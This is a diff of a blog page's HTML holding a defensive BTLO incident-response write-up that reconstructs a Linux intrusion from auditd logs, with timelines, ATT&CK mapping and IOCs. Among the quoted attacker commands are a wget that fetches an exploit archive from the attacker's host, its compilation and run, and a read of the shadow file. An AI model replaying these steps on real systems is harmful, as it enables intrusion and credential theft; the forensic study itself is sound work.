@@ -1,79 +1,102 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-        <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="author" content="">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>BTLO Incident Response Case Study: Pranoid :: Hello w3nch</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="description" content="Executive Summary A forensic review of Linux auditd logs confirms that the host was compromised through an external SSH brute-force attack. The attacker authenticated as a low-privileged user, executed automated system enumeration, escalated privileges using a local sudo vulnerability, accessed sensitive credential material, and attempted basic anti-forensic cleanup. The entire intrusion lifecycle occurred within approximately six minutes.
 Scope and Evidence Primary artifact:
 audit.log (Linux auditd) Tools used:
 aureport ausearch Manual timeline correlation Observed timeframe:" />
-<meta name="keywords" content=", btlo, incident-response, linux, auditd, bruteforce, privilege-escalation, forensics" />
-<meta name="robots" content="noodp" />
-<meta name="theme-color" content="" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
 <link rel="canonical" href="http://localhost:1313/writeups/btlo/incident-response/paranoid/" />
 
 
-    <title>
-        
-            BTLO Incident Response Case Study: Pranoid :: Hello w3nch 
-        
-    </title>
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/code.min.64355604529405b8a6a03699668a57f6e03d8fd15b6b3b96cf9364bf18a602f8.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/writeups.min.f97cbcd47e8113ea91483092b8ce27fd630e9643fa563f0ba30c56c5fb1557c4.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
 
 
 
 
 
-  <link rel="stylesheet" href="/main.min.ebe3824dfa5345ef854f8b255c278f701966e9be3892354b588fb1650ecd358e.css" integrity="sha256-6&#43;OCTfpTRe&#43;FT4slXCePcBlm6b44kjVLWI&#43;xZQ7NNY4=" crossorigin="anonymous">
+
+
+<link rel="shortcut icon" href="http://localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
 
 
 
-
-    
-        <link rel="stylesheet" type="text/css" href="css/code.css">
-    
-
-    
-        <link rel="stylesheet" type="text/css" href="css/writeups.css">
-    
-
-
-    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-    <link rel="manifest" href="/site.webmanifest">
-    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
-    <link rel="shortcut icon" href="/favicon.ico">
-    <meta name="msapplication-TileColor" content="">
-
-
-<meta itemprop="name" content="BTLO Incident Response Case Study: Pranoid">
-<meta itemprop="description" content="Executive Summary A forensic review of Linux auditd logs confirms that the host was compromised through an external SSH brute-force attack. The attacker authenticated as a low-privileged user, executed automated system enumeration, escalated privileges using a local sudo vulnerability, accessed sensitive credential material, and attempted basic anti-forensic cleanup. The entire intrusion lifecycle occurred within approximately six minutes.
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="BTLO Incident Response Case Study: Pranoid">
+<meta property="og:description" content="Executive Summary A forensic review of Linux auditd logs confirms that the host was compromised through an external SSH brute-force attack. The attacker authenticated as a low-privileged user, executed automated system enumeration, escalated privileges using a local sudo vulnerability, accessed sensitive credential material, and attempted basic anti-forensic cleanup. The entire intrusion lifecycle occurred within approximately six minutes.
 Scope and Evidence Primary artifact:
 audit.log (Linux auditd) Tools used:
-aureport ausearch Manual timeline correlation Observed timeframe:"><meta itemprop="datePublished" content="2026-01-28T00:00:00+00:00" />
-<meta itemprop="dateModified" content="2026-01-28T00:00:00+00:00" />
-<meta itemprop="wordCount" content="1002">
-<meta itemprop="keywords" content="btlo,incident-response,linux,auditd,bruteforce,privilege-escalation,forensics," />
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="BTLO Incident Response Case Study: Pranoid"/>
-<meta name="twitter:description" content="Executive Summary A forensic review of Linux auditd logs confirms that the host was compromised through an external SSH brute-force attack. The attacker authenticated as a low-privileged user, executed automated system enumeration, escalated privileges using a local sudo vulnerability, accessed sensitive credential material, and attempted basic anti-forensic cleanup. The entire intrusion lifecycle occurred within approximately six minutes.
-Scope and Evidence Primary artifact:
-audit.log (Linux auditd) Tools used:
-aureport ausearch Manual timeline correlation Observed timeframe:"/>
+aureport ausearch Manual timeline correlation Observed timeframe:" />
+<meta property="og:url" content="http://localhost:1313/writeups/btlo/incident-response/paranoid/" />
+<meta property="og:site_name" content="Hello w3nch" />
+
+  <meta property="og:image" content="http://localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="Incident Response" />
+
+  <meta property="article:section" content="Linux Forensics" />
 
 
-
-
-
-    <meta property="article:section" content="Incident Response" />
-
-    <meta property="article:section" content="Linux Forensics" />
-
-
-
-    <meta property="article:published_time" content="2026-01-28 00:00:00 &#43;0000 UTC" />
+  <meta property="article:published_time" content="2026-01-28 00:00:00 &#43;0000 UTC" />
 
 
 
@@ -86,85 +109,127 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 
 
 
-    </head>
+</head>
+<body>
 
-    
-        <body>
-    
-    
-        <div class="container">
-            <header class="header">
-    <span class="header__inner">
-        <a href="/" style="text-decoration: none;">
-    <div class="logo">
-        
-            <span class="logo__mark">></span>
-            <span class="logo__text ">
-                hello ;)</span>
-            <span class="logo__cursor" style=
-                  "
-                   
-                   ">
-            </span>
-        
-    </div>
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    hello ;)
+  </div>
 </a>
 
-
-        <span class="header__right">
-                <nav class="menu">
-    <ul class="menu__inner">
-                <li><a href="/about/">About</a></li>
-            
-                <li><a href="/posts/">Blog</a></li>
-            
-                <li><a href="/contact/">Contact</a></li>
-            
-                <li><a href="/resume.pdf">Resume</a></li>
-            
-                <li><a href="/writeups/">Writeup</a></li>
-            
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/posts/">Blog</a></li>
+        
+      
+        
+          <li><a href="/about/">About</a></li>
+        
+      
+        
+          <li><a href="/contact/">Contact</a></li>
+        
+      
+        
+          <li><a href="/resume.pdf">Resume</a></li>
+        
+      
+        
+          <li><a href="/writeups/">Writeup</a></li>
+        
+      
+      
     </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/posts/" >Blog</a></li>
+        
+      
+        
+          <li><a href="/about/" >About</a></li>
+        
+      
+        
+          <li><a href="/contact/" >Contact</a></li>
+        
+      
+        
+          <li><a href="/resume.pdf" >Resume</a></li>
+        
+      
+        
+          <li><a href="/writeups/" >Writeup</a></li>
+        
+      
+      
+    
+  </ul>
 </nav>
 
-
-                <span class="menu-trigger">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                        <path d="M0 0h24v24H0z" fill="none"/>
-                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
-                    </svg>
-                </span>
-                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
-   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
- </svg></span>
-        </span>
-    </span>
+  
 </header>
 
 
-            
-    <div class="content">
-        <main class="post">
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/writeups/btlo/incident-response/paranoid/">BTLO Incident Response Case Study: Pranoid</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2026-01-28</time></div>
 
-            <div class="post-info">
-                
-                </p>
-            </div>
+  
+    <span class="post-tags">
+      
+      #<a href="http://localhost:1313/tags/btlo/">btlo</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/incident-response/">incident-response</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/linux/">linux</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/auditd/">auditd</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/bruteforce/">bruteforce</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/privilege-escalation/">privilege-escalation</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/forensics/">forensics</a>&nbsp;
+      
+    </span>
+  
+  
 
-            <article>
-                <h2 class="post-title"><a href="http://localhost:1313/writeups/btlo/incident-response/paranoid/">BTLO Incident Response Case Study: Pranoid</a></h2>
 
-                
-                
-                
+  
 
-                <div class="post-content">
-                    <h2 id="executive-summary">Executive Summary</h2>
+  <div class="post-content"><div>
+        <h2 id="executive-summary">Executive Summary<a href="#executive-summary" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>A forensic review of Linux auditd logs confirms that the host was compromised through an external SSH brute-force attack. The attacker authenticated as a low-privileged user, executed automated system enumeration, escalated privileges using a local sudo vulnerability, accessed sensitive credential material, and attempted basic anti-forensic cleanup. The entire intrusion lifecycle occurred within approximately six minutes.</p>
 <hr>
-<h2 id="scope-and-evidence">Scope and Evidence</h2>
+<h2 id="scope-and-evidence">Scope and Evidence<a href="#scope-and-evidence" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>Primary artifact:</p>
 <ul>
 <li>audit.log (Linux auditd)</li>
@@ -179,7 +244,7 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 <ul>
 <li>2021-10-04 20:22:07 to 2021-10-04 20:28:06</li>
 </ul>
-<h2 id="initial-triage-and-signal-identification">Initial Triage and Signal Identification</h2>
+<h2 id="initial-triage-and-signal-identification">Initial Triage and Signal Identification<a href="#initial-triage-and-signal-identification" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>A summary analysis of the audit log shows extreme activity density over a short time window:</p>
 <ul>
 <li>87 failed login attempts</li>
@@ -191,21 +256,21 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 <li>16,732 total audit events</li>
 </ul>
 <p>This volume and velocity of activity is inconsistent with human interaction and strongly indicative of automation.</p>
-<h2 id="initial-access-vector">Initial Access Vector</h2>
-<h3 id="authentication-activity">Authentication Activity</h3>
+<h2 id="initial-access-vector">Initial Access Vector<a href="#initial-access-vector" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="authentication-activity">Authentication Activity<a href="#authentication-activity" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <p>Audit records show repeated SSH authentication attempts targeting a single user account.</p>
-<p><img src="https://i.ibb.co/W43Lcwff/Pasted-image-20260128153416.png" alt=""></p>
+<p><img src="https://i.ibb.co/W43Lcwff/Pasted-image-20260128153416.png"></p>
 <p>Targeted account:</p>
 <ul>
 <li>Username: btlo</li>
 <li>UID: 1001</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ausearch --input audit.log -m USER_AUTH,USER_LOGIN <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| grep -E <span style="color:#e6db74">&#34;res=failed|success=no&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| grep -E <span style="color:#e6db74">&#34;addr=|rhost=&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| sed -n <span style="color:#e6db74">&#39;s/.*addr=\([^ ]*\).*/\1/p&#39;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| sort | uniq -c | sort -nr
-</span></span></code></pre></div><p><img src="https://i.ibb.co/VcqPZmW4/Pasted-image-20260128154343.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ausearch --input audit.log -m USER_AUTH,USER_LOGIN <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="p">|</span> grep -E <span class="s2">&#34;res=failed|success=no&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="p">|</span> grep -E <span class="s2">&#34;addr=|rhost=&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="p">|</span> sed -n <span class="s1">&#39;s/.*addr=\([^ ]*\).*/\1/p&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="p">|</span> sort <span class="p">|</span> uniq -c <span class="p">|</span> sort -nr
+</span></span></code></pre></div><p><img src="https://i.ibb.co/VcqPZmW4/Pasted-image-20260128154343.png"></p>
 <p>Source of authentication attempts:</p>
 <ul>
 <li>IP address: 192.168.4.155</li>
@@ -217,10 +282,10 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 <li>One successful authentication from the same source IP</li>
 </ul>
 <p>This pattern confirms a successful SSH brute-force attack.</p>
-<h2 id="post-compromise-command-activity">Post-Compromise Command Activity</h2>
+<h2 id="post-compromise-command-activity">Post-Compromise Command Activity<a href="#post-compromise-command-activity" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>Immediately following authentication, terminal (TTY) logs reveal a structured sequence of commands executed by the attacker.</p>
-<h3 id="initial-environment-reconnaissance">Initial Environment Reconnaissance</h3>
-<p><img src="https://i.ibb.co/jvgjcpy1/Pasted-image-20260128153618.png" alt=""></p>
+<h3 id="initial-environment-reconnaissance">Initial Environment Reconnaissance<a href="#initial-environment-reconnaissance" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><img src="https://i.ibb.co/jvgjcpy1/Pasted-image-20260128153618.png"></p>
 <p>Commands observed:</p>
 <ul>
 <li>hostname</li>
@@ -236,7 +301,7 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 <li>Check sudo permissions and misconfigurations</li>
 </ul>
 <p>These commands are typical of post-login validation performed by attackers.</p>
-<h2 id="automated-system-enumeration">Automated System Enumeration</h2>
+<h2 id="automated-system-enumeration">Automated System Enumeration<a href="#automated-system-enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>Shortly after initial recon, the attacker retrieved and executed an enumeration script from the same external IP used during brute-force attempts.</p>
 <p>Command observed:</p>
 <ul>
@@ -254,9 +319,9 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 <li>Identification of local privilege escalation vectors</li>
 </ul>
 <p>The execution of linpeas explains the subsequent surge in command executions and process creation.</p>
-<h2 id="privilege-escalation-staging">Privilege Escalation Staging</h2>
+<h2 id="privilege-escalation-staging">Privilege Escalation Staging<a href="#privilege-escalation-staging" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>Following enumeration, the attacker staged a local exploit.</p>
-<p><img src="https://i.ibb.co/n8t2Yxm3/Pasted-image-20260128154055.png" alt=""></p>
+<p><img src="https://i.ibb.co/n8t2Yxm3/Pasted-image-20260128154055.png"></p>
 <p>Commands observed:</p>
 <ul>
 <li>wget http://192.168.4.155:8000/evil.tar.gz</li>
@@ -264,8 +329,8 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 <li>cd evil</li>
 <li>make</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo aureport -p -if audit.log pipe grep <span style="color:#e6db74">&#39;evil&#39;</span>
-</span></span><span style="display:flex;"><span>16156. 05/10/21 05:57:17 <span style="color:#ae81ff">829992</span> /home/btlo/evil/evil <span style="color:#ae81ff">59</span> <span style="color:#ae81ff">1001</span> <span style="color:#ae81ff">481021</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo aureport -p -if audit.log pipe grep <span class="s1">&#39;evil&#39;</span>
+</span></span><span class="line"><span class="cl">16156. 05/10/21 05:57:17 <span class="m">829992</span> /home/btlo/evil/evil <span class="m">59</span> <span class="m">1001</span> <span class="m">481021</span>
 </span></span></code></pre></div><p>Source:</p>
 <ul>
 <li>Remote host: 192.168.4.155</li>
@@ -276,9 +341,9 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 <li>Deliver exploit source code</li>
 <li>Compile exploit locally to evade signature-based detection</li>
 </ul>
-<h2 id="privilege-escalation-execution">Privilege Escalation Execution</h2>
+<h2 id="privilege-escalation-execution">Privilege Escalation Execution<a href="#privilege-escalation-execution" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>The attacker executed the compiled binary:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ausearch --input audit.log -m EXECVE | grep evil
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ausearch --input audit.log -m EXECVE <span class="p">|</span> grep evil
 </span></span></code></pre></div><p>Command observed:</p>
 <ul>
 <li>./evil 0</li>
@@ -296,7 +361,7 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 <li>whoami</li>
 </ul>
 <p>Subsequent actions confirm that the exploit successfully escalated privileges to root.</p>
-<h2 id="anti-forensic-cleanup">Anti-Forensic Cleanup</h2>
+<h2 id="anti-forensic-cleanup">Anti-Forensic Cleanup<a href="#anti-forensic-cleanup" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>After achieving elevated privileges, the attacker removed exploit artifacts.</p>
 <p>Commands observed:</p>
 <ul>
@@ -309,7 +374,7 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 <li>Reduce post-incident forensic artifacts</li>
 </ul>
 <p>This cleanup was minimal but deliberate.</p>
-<h2 id="data-access-and-impact">Data Access and Impact</h2>
+<h2 id="data-access-and-impact">Data Access and Impact<a href="#data-access-and-impact" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>With root-level access confirmed, the attacker accessed sensitive credential storage.</p>
 <p>Command observed:</p>
 <ul>
@@ -321,7 +386,7 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 <li>Full credential compromise of the host</li>
 </ul>
 <p>This action confirms total system compromise and high business impact.</p>
-<h2 id="root-cause-analysis">Root Cause Analysis</h2>
+<h2 id="root-cause-analysis">Root Cause Analysis<a href="#root-cause-analysis" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>The attack chain follows a well-established intrusion pattern:</p>
 <ol>
 <li>External SSH brute-force attack</li>
@@ -334,7 +399,7 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 <li>Anti-forensic artifact removal</li>
 </ol>
 <p>The exploit behavior and timeframe align with CVE-2021-3156, a heap-based buffer overflow vulnerability in sudo.</p>
-<h2 id="mitre-attck-mapping">MITRE ATT&amp;CK Mapping</h2>
+<h2 id="mitre-attck-mapping">MITRE ATT&amp;CK Mapping<a href="#mitre-attck-mapping" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <table>
 <thead>
 <tr>
@@ -411,8 +476,8 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 </tr>
 </tbody>
 </table>
-<h2 id="indicators-of-compromise-iocs">Indicators of Compromise (IOCs)</h2>
-<h3 id="network-iocs">Network IOCs</h3>
+<h2 id="indicators-of-compromise-iocs">Indicators of Compromise (IOCs)<a href="#indicators-of-compromise-iocs" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="network-iocs">Network IOCs<a href="#network-iocs" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <table>
 <thead>
 <tr>
@@ -449,7 +514,7 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 </tr>
 </tbody>
 </table>
-<h3 id="host-based-iocs">Host-Based IOCs</h3>
+<h3 id="host-based-iocs">Host-Based IOCs<a href="#host-based-iocs" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <table>
 <thead>
 <tr>
@@ -496,7 +561,7 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 </tr>
 </tbody>
 </table>
-<h3 id="behavioral-iocs">Behavioral IOCs</h3>
+<h3 id="behavioral-iocs">Behavioral IOCs<a href="#behavioral-iocs" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <table>
 <thead>
 <tr>
@@ -527,7 +592,7 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 </tr>
 </tbody>
 </table>
-<h3 id="challenge-submission">Challenge Submission</h3>
+<h3 id="challenge-submission">Challenge Submission<a href="#challenge-submission" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <ul>
 <li>
 <p><strong>Compromised account:</strong> <code>btlo</code></p>
@@ -555,7 +620,7 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 </li>
 </ul>
 <hr>
-<h2 id="conclusion">Conclusion</h2>
+<h2 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>This incident demonstrates how a combination of weak authentication controls and unpatched local vulnerabilities can lead to rapid and complete system compromise. Despite the absence of a SIEM or EDR platform, auditd logs provided sufficient telemetry to reconstruct the attacker’s full kill chain with high confidence.</p>
 <p>The case reinforces the importance of:</p>
 <ul>
@@ -565,73 +630,116 @@ aureport ausearch Manual timeline correlation Observed timeframe:"/>
 <li>Retention and review of auditd logs for forensic readiness</li>
 </ul>
 
-                </div>
-            </article>
+      </div></div>
 
-            <hr />
+  
 
-            <div class="post-info">
-                
-    <p>
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
-
-        <span class="tag"><a href="http://localhost:1313/tags/btlo/">btlo</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/incident-response/">incident-response</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/linux/">linux</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/auditd/">auditd</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/bruteforce/">bruteforce</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/privilege-escalation/">privilege-escalation</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/forensics/">forensics</a></span>
-        
-    </p>
-
-                
-    <p>
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
-
-        <span class="tag"><a href="http://localhost:1313/categories/incident-response/">Incident Response</a></span>
-        <span class="tag"><a href="http://localhost:1313/categories/linux-forensics/">Linux Forensics</a></span>
-        
-    </p>
-
-            </div>
-        </main>
-    </div>
-
-
-            
-                <footer class="footer">
+  
     
-    <div class="footer__inner">
-        <div class="footer__content">
-            
-            <span><a href="http://localhost:1313/"></a></span>
-            <span></span>
-            
-            
-        </div>
-    </div>
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
     
+      <div class="copyright copyright--user">
+        <span>© 1337 w3nch</span>
     
-    <div class="footer__inner">
-        <div class="footer__content">
-            <span>Powered by Hugo</span>
-        </div>
-    </div>
-    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
 </footer>
 
-            
-        </div>
-
-        
-
-
-
-<script type="text/javascript" src="/bundle.min.19d7885e5a4b0e5e2cd7238fc80b8b19888099cb78c032aedeb0b3b0010b8bb3dfb34849cf40a9e83f55f266aa32354528c10a24f2a42e6e8e21e813a26d9647.js" integrity="sha512-GdeIXlpLDl4s1yOPyAuLGYiAmct4wDKu3rCzsAELi7Pfs0hJz0Cp6D9V8maqMjVFKMEKJPKkLm6OIegTom2WRw=="></script>
 
 
 
 
-    </body>
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+<script>
+(function() {
+  const themes = {
+    terminal: {
+      '--background': '#1a170f',
+      '--foreground': '#eceae5',
+      '--accent': '#eec35e'
+    },
+    latte: {
+      '--background': '#eff1f5',
+      '--foreground': '#4c4f69',
+      '--accent': '#dc8a78'
+    },
+    frappe: {
+      '--background': '#303446',
+      '--foreground': '#c6d0f5',
+      '--accent': '#f2d5cf'
+    },
+    macchiato: {
+      '--background': '#24273a',
+      '--foreground': '#cad3f5',
+      '--accent': '#f4dbd6'
+    },
+    mocha: {
+      '--background': '#1e1e2e',
+      '--foreground': '#cdd6f4',
+      '--accent': '#f5e0dc'
+    },
+    paper: {
+      '--background': '#faf9f6',
+      '--foreground': '#2d2d2d',
+      '--accent': '#4a4a4a'
+    }
+  };
+
+  const saved = localStorage.getItem('terminal-theme') || 'terminal';
+  function applyTheme(name) {
+    const t = themes[name] || themes.terminal;
+    for (const [k, v] of Object.entries(t)) {
+      document.documentElement.style.setProperty(k, v);
+    }
+    localStorage.setItem('terminal-theme', name);
+    document.querySelectorAll('.theme-btn').forEach(b => {
+      b.classList.toggle('active', b.dataset.theme === name);
+    });
+  }
+
+  function createButtons() {
+    const nav = document.querySelector('.header__inner');
+    if (!nav) return;
+    const div = document.createElement('div');
+    div.className = 'theme-switcher';
+    div.style.cssText = 'display:flex;gap:8px;align-items:center;margin-left:12px;';
+    Object.keys(themes).forEach(name => {
+      const btn = document.createElement('button');
+      btn.className = 'theme-btn';
+      btn.dataset.theme = name;
+      btn.textContent = name.charAt(0).toUpperCase() + name.slice(1);
+      btn.style.cssText = 'padding:4px 10px;font-size:0.75rem;border-width:2px;';
+      btn.onclick = () => applyTheme(name);
+      div.appendChild(btn);
+    });
+    nav.appendChild(div);
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', () => { createButtons(); applyTheme(saved); });
+  } else {
+    createButtons();
+    applyTheme(saved);
+  }
+})();
+</script>
+</body>
 </html>
